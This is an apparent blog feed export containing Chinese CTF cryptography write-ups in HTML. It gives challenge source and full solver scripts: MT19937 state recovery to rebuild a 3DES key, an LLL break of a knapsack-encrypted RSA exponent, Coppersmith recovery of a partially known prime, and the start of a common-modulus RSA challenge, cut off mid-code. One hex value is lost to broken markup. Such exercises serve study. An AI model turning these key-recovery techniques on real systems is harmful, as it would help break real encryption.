class="hljs-keyword">def</span> <span class="hljs-title function_">Rand</span>():<br>    rseed = secrets.randbits(<span class="hljs-number">1024</span>)<br>    List1 = []<br>    List2 = []<br>    seed(rseed)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        rand16 = getrandbits(<span class="hljs-number">16</span>)<br>        List1.append(rand16)<br>    seed(rseed)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">312</span>):<br>        rand64 = getrandbits(<span class="hljs-number">64</span>)<br>        List2.append(rand64)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;task.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> rand16 <span class="hljs-keyword">in</span> List1:<br>            file.write(<span class="hljs-built_in">hex</span>(rand16)+ <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">for</span> rand64 <span class="hljs-keyword">in</span> List2:<br>            file.write(<span class="hljs-built_in">hex</span>((rand64 &amp; <span class="hljs-number">0xffff</span>) | ((rand64 &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br>Rand()<br><br>K2 = long_to_bytes(getrandbits(<span class="hljs-number">64</span>))<br>K3 = flag[:<span class="hljs-number">8</span>]<br><br>KEY = K1 + K2 + K3<br><br>IV=iv<br><br>IV1=IV[:<span class="hljs-built_in">len</span>(IV)//<span class="hljs-number">2</span>]<br>IV2=IV[<span class="hljs-built_in">len</span>(IV)//<span class="hljs-number">2</span>:]<br><br>digest1 = hashlib.sha512(IV1).digest().<span class="hljs-built_in">hex</span>()<br>digest2 = hashlib.sha512(IV2).digest().<span class="hljs-built_in">hex</span>()<br><br>digest=digest1+digest2<br>hint2=(bytes_to_long(IV)&lt;&lt;<span class="hljs-number">32</span>)^bytes_to_long(os.urandom(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bytes_to_long((digest.encode()))))<br><span class="hljs-built_in">print</span>(hint2)<br><br><br>mode = DES3.MODE_CBC<br>des3 = DES3.new(KEY, mode, IV)<br><br>pad_len = <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">8</span><br>padding = <span class="hljs-built_in">bytes</span>([pad_len]) * pad_len<br>flag += padding<br><br>cipher = des3.encrypt(flag)<br><br><br>ciphertext=cipher.<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(ciphertext)<br><br><span class="hljs-comment"># 334648638865560142973669981316964458403</span><br><span class="hljs-comment"># 0xspan><br><span class="hljs-comment"># 22078953819177294945130027344</span><br><span class="hljs-comment"># a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>根据题目分析，我们的主要目的是根据存在的漏洞恢复$key$和$IV$</p><h2 id="Part1：恢复key"><a href="#Part1：恢复key" class="headerlink" title="Part1：恢复key"></a>Part1：恢复key</h2><h3 id="（1）恢复K1"><a href="#（1）恢复K1" class="headerlink" title="（1）恢复K1"></a>（1）恢复K1</h3><p>使用<code>long_to_bytes(xor)</code>可以发现，前8个字节是四组重复的，符合$hint1$的特点，猜测$K1$应该只有8个字节，因此使用前八个字节异或上后8个字节便可以恢复$K1$</p><h3 id="（2）恢复K2"><a href="#（2）恢复K2" class="headerlink" title="（2）恢复K2"></a>（2）恢复K2</h3><p>对于MT19937提交624个32bit数，便能够预测后边的随机数，但题目中并没有直接给出624个32bit数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> rand16 <span class="hljs-keyword">in</span> List1:<br>    file.write(<span class="hljs-built_in">hex</span>(rand16)+ <span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-keyword">for</span> rand64 <span class="hljs-keyword">in</span> List2:<br>    file.write(<span class="hljs-built_in">hex</span>((rand64 &amp; <span class="hljs-number">0xffff</span>) | ((rand64 &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>已知<code>List1</code>和<code>List2</code>都是从头开始生成的，且输出到文件中的<code>list2</code>序列是不完整的，只输出了每个$rand64$的<code>[:16]</code>和<code>[32:48]</code>。因此我们需要想想办法恢复出624个32bit数<br><code>getrandbits(16)</code>的生成规则是每次生成一个32bit数，再从这个32bit数中截取16位作为生成的随机数。<br>因此<code>List1</code>就是<code>List2</code>的缺失部分，我们可以通过拆分拼接<code>List1</code>和<code>List2</code>得到624个32bit数。</p><h3 id="（3）恢复K3"><a href="#（3）恢复K3" class="headerlink" title="（3）恢复K3"></a>（3）恢复K3</h3><p>K3为<code>flag[:8]</code>，已知前7个字节为<code>DASCTF&#123;</code>，因此爆破一个字节便可以</p><h2 id="Part2：恢复IV"><a href="#Part2：恢复IV" class="headerlink" title="Part2：恢复IV"></a>Part2：恢复IV</h2><h3 id="（1）恢复IV1"><a href="#（1）恢复IV1" class="headerlink" title="（1）恢复IV1"></a>（1）恢复IV1</h3><p>$IV$共8个字节，而$hint2$为$IV$向左移动了4个字节之后和8个字节的随机字节进行异或，说明高4个字节，即$IV1$未参与运算，$hint2$的高4个字节便是$IV1$</p><h3 id="（2）恢复IV2"><a href="#（2）恢复IV2" class="headerlink" title="（2）恢复IV2"></a>（2）恢复IV2</h3><p>根据（1）算出的$IV1$可以计算出$digest1$，同时题目给出了$digest$，在$digest$中去除$digest2$之后便剩下了$digest2$<br>。虽然我们这里只获得了$IV2$的哈希值，可能需要爆破，但是求出来之后我们发现$digest2&#x3D;digest1$，我们默认不存在碰撞，即$IV2&#x3D;IV1$</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES3<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">import</span> hashlib<br><br>ciphertext = <span class="hljs-number">0xa6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span><br><span class="hljs-comment">#恢复IV1和IV2</span><br>dig = <span class="hljs-number">0xspan><br>dig_int = <span class="hljs-built_in">int</span>(dig)<br>dig0 = long_to_bytes(dig_int).decode()<br>hint2 = <span class="hljs-number">22078953819177294945130027344</span><br>IV1 = long_to_bytes(hint2&gt;&gt;<span class="hljs-number">64</span>)<br><span class="hljs-built_in">print</span>(IV1)<br>dig1 = hashlib.sha512(IV1).digest().<span class="hljs-built_in">hex</span>()<br><span class="hljs-keyword">if</span> dig1 == dig0[:<span class="hljs-built_in">len</span>(dig1)]:<br>    dig2 = dig0[<span class="hljs-built_in">len</span>(dig1):]<br><span class="hljs-comment">#print(dig2)</span><br>IV2 = IV1<br><br><span class="hljs-comment">#恢复K1</span><br>xor1 = <span class="hljs-number">334648638865560142973669981316964458403</span><br>xor_bytes = long_to_bytes(xor1)<br>K1 = xor(xor_bytes[:<span class="hljs-number">8</span>], xor_bytes[<span class="hljs-number">8</span>:])<br><span class="hljs-comment">#print(K1)</span><br><br><span class="hljs-comment">#恢复K2</span><br>rc = RandCrack()<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;task.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>lines = file.readlines()<br>List1 = lines[:<span class="hljs-number">624</span>]<br>List2 = lines[<span class="hljs-number">624</span>:]<br><span class="hljs-comment">#print(List1)</span><br><span class="hljs-comment">#print(List2)</span><br>List22 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> List2:<br>    val = <span class="hljs-built_in">int</span>(i.strip(),<span class="hljs-number">16</span>)<br>    low = val &amp; <span class="hljs-number">0xFFFF</span><br>    high = (val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>    List22.append(low)<br>    List22.append(high)<br><span class="hljs-comment">#print(len(List22))</span><br>randlist = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    val = <span class="hljs-built_in">int</span>(List1[i].strip(),<span class="hljs-number">16</span>)<br>    randlist.append(val &lt;&lt; <span class="hljs-number">16</span> | List22[i])<br>    rc.submit(randlist[i])<br>K2 = long_to_bytes(rc.predict_getrandbits(<span class="hljs-number">64</span>))<br><span class="hljs-comment">#print(K2)</span><br><br><span class="hljs-comment">#爆破K3并尝试解密</span><br>K3_t = bytes_to_long(<span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span>)&lt;&lt;<span class="hljs-number">8</span><br>IV = IV1 + IV2<br><span class="hljs-built_in">print</span>(IV)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>):<br>    K3 = long_to_bytes(K3_t + i)<br>    key = K1 + K2 + K3<br>    <span class="hljs-comment">#print(key)</span><br>    des3 = DES3.new(key, DES3.MODE_CBC, IV)<br>    decrypt = des3.decrypt(long_to_bytes(<span class="hljs-built_in">int</span>(ciphertext)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> decrypt:<br>        <span class="hljs-built_in">print</span>(decrypt)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pubkey</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, m, w</span>):<br>    pubkey_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_bin)):<br>        pubkey_list.append(w * <span class="hljs-built_in">list</span>[i] % m)<br>    <span class="hljs-keyword">return</span> pubkey_list<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">e_cry</span>(<span class="hljs-params">e, pubkey</span>):<br>    pubkey_list = pubkey<br>    encode = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e)):<br>        encode += pubkey_list[i] * <span class="hljs-built_in">int</span>(e[i]) % m<br>    <span class="hljs-keyword">return</span> encode<br><br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = getPrime(<span class="hljs-number">64</span>)<br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>e_bin = (<span class="hljs-built_in">bin</span>(e))[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_bin))]<br>m = getPrime(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>))) - <span class="hljs-number">1</span>)<br>w = getPrime(<span class="hljs-number">64</span>)<br>pubkey = pubkey(<span class="hljs-built_in">list</span>, m, w)<br>en_e = e_cry(e_bin, pubkey)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;n = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;c = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;pubkey = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;en_e = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((p &gt;&gt; <span class="hljs-number">435</span>) &lt;&lt; <span class="hljs-number">435</span>, n, c, pubkey, en_e))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span><br><span class="hljs-string">n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span><br><span class="hljs-string">c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span><br><span class="hljs-string">pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]</span><br><span class="hljs-string">en_e = 31087054322877663244023458448558</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>根据题目，可以发现，我们需要求$p_{low}$和$e$，其中$p_{low}$可以利用coppersmith定理来求解。<br>而对于$e$来说，观察$e_cry$发现它是将$e$的二进制的每一位用于背包加密了。<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>en_e = <span class="hljs-number">31087054322877663244023458448558</span><br>nbits=<span class="hljs-number">64</span><br>pubkey = [<span class="hljs-number">18143710780782459577</span>, <span class="hljs-number">54431132342347378731</span>, <span class="hljs-number">163293397027042136193</span>, <span class="hljs-number">489880191081126408579</span>, <span class="hljs-number">1469640573243379225737</span>, <span class="hljs-number">4408921719730137677211</span>, <span class="hljs-number">13226765159190413031633</span>, <span class="hljs-number">39680295477571239094899</span>, <span class="hljs-number">119040886432713717284697</span>, <span class="hljs-number">357122659298141151854091</span>, <span class="hljs-number">1071367977894423455562273</span>, <span class="hljs-number">3214103933683270366686819</span>, <span class="hljs-number">9642311801049811100060457</span>, <span class="hljs-number">28926935403149433300181371</span>, <span class="hljs-number">86780806209448299900544113</span>, <span class="hljs-number">260342418628344899701632339</span>, <span class="hljs-number">781027255885034699104897017</span>, <span class="hljs-number">2343081767655104097314691051</span>, <span class="hljs-number">7029245302965312291944073153</span>, <span class="hljs-number">21087735908895936875832219459</span>, <span class="hljs-number">63263207726687810627496658377</span>, <span class="hljs-number">189789623180063431882489975131</span>, <span class="hljs-number">569368869540190295647469925393</span>, <span class="hljs-number">1708106608620570886942409776179</span>, <span class="hljs-number">601827224419797931380408071500</span>, <span class="hljs-number">1805481673259393794141224214500</span>, <span class="hljs-number">893952418336266652976851386463</span>, <span class="hljs-number">2681857255008799958930554159389</span>, <span class="hljs-number">3523079163584485147344841221130</span>, <span class="hljs-number">1524252287869625983140881149316</span>, <span class="hljs-number">50264262166963219975822190911</span>, <span class="hljs-number">150792786500889659927466572733</span>, <span class="hljs-number">452378359502668979782399718199</span>, <span class="hljs-number">1357135078508006939347199154597</span>, <span class="hljs-number">4071405235524020818041597463791</span>, <span class="hljs-number">3169230503688232995231149877299</span>, <span class="hljs-number">462706308180869526799807117823</span>, <span class="hljs-number">1388118924542608580399421353469</span>, <span class="hljs-number">4164356773627825741198264060407</span>, <span class="hljs-number">3448085117999647764701149667147</span>, <span class="hljs-number">1299270151115113835209806487367</span>, <span class="hljs-number">3897810453345341505629419462101</span>, <span class="hljs-number">2648446157152195057994615872229</span>, <span class="hljs-number">3422845870014670444537026359650</span>, <span class="hljs-number">1223552407160181874717436564876</span>, <span class="hljs-number">3670657221480545624152309694628</span>, <span class="hljs-number">1966986461557807413563286569810</span>, <span class="hljs-number">1378466783231507511243038452393</span>, <span class="hljs-number">4135400349694522533729115357179</span>, <span class="hljs-number">3361215846199738142293703557463</span>, <span class="hljs-number">1038662335715384967987468158315</span>, <span class="hljs-number">3115987007146154903962404474945</span>, <span class="hljs-number">302975818554635252993570910761</span>, <span class="hljs-number">908927455663905758980712732283</span>, <span class="hljs-number">2726782366991717276942138196849</span>, <span class="hljs-number">3657854499533237101379593333510</span>, <span class="hljs-number">1928578295715881845245137486456</span>, <span class="hljs-number">1263242285705730806288591202331</span>, <span class="hljs-number">3789726857117192418865773606993</span>, <span class="hljs-number">2324195368467747797703678306905</span>, <span class="hljs-number">2450093503961328663664213663678</span>, <span class="hljs-number">2827787910442071261545819733997</span>, <span class="hljs-number">3960871129884299055190637944954</span>, <span class="hljs-number">2837628186769067706678271320788</span>]<br>p_high = <span class="hljs-number">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span><br>n = <span class="hljs-number">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span><br>c = <span class="hljs-number">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span><br><br><span class="hljs-comment">#格基规约解背包密码求e</span><br>A=Matrix(ZZ,nbits+<span class="hljs-number">1</span>,nbits+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(pubkey))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i,i]=<span class="hljs-number">2</span><br>    A[i,-<span class="hljs-number">1</span>]=pubkey[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits+<span class="hljs-number">1</span>):<br>    A[-<span class="hljs-number">1</span>,i]=<span class="hljs-number">1</span><br>A[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=en_e<br>L=A.LLL()<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> L:<br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l[:-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span> i != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> i !=-<span class="hljs-number">1</span>:<br>            f = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(l)<br>        r = <span class="hljs-built_in">list</span>(l[:-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br>e_bin = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r)):<br>    <span class="hljs-keyword">if</span> r[i] == -<span class="hljs-number">1</span>:<br>        e_bin = e_bin + <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#观察首位是1还是-1，由于要保证e的位数，因此首位是什么，什么就是1</span><br>    <span class="hljs-keyword">elif</span> r[i] == <span class="hljs-number">1</span> :<br>        e_bin = e_bin + <span class="hljs-string">&#x27;0&#x27;</span><br>e = <span class="hljs-built_in">int</span>(e_bin, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-comment">#coppersmith求p_low</span><br>pbits=<span class="hljs-number">1024</span><br>kbits=<span class="hljs-number">435</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = p_high + x <br>roots = f.small_roots(X=<span class="hljs-number">2</span>^kbits,beta=<span class="hljs-number">0.4</span>)<br><br>p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans= long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2024 Crypto复现</title>
    <link href="/2025/07/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202024%20Crypto%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/07/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202024%20Crypto%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>本文是关于极客大挑战2024 Crypto方向的部分题目复现，本次复现主要目的是刷题，因此并没有写详细的解题步骤，总结来说，这个比赛的题目难度都不是很大，覆盖面较广，适合新手练习(<em>ﾟ∀ﾟ</em>)</p><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p,q = [getPrime(<span class="hljs-number">1024</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)] <br>n = p*q<br>e = [getPrime(<span class="hljs-number">10</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br><br>m = bytes_to_long(flag)<br><br>c = [<span class="hljs-built_in">pow</span>(m, e[i], n) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span 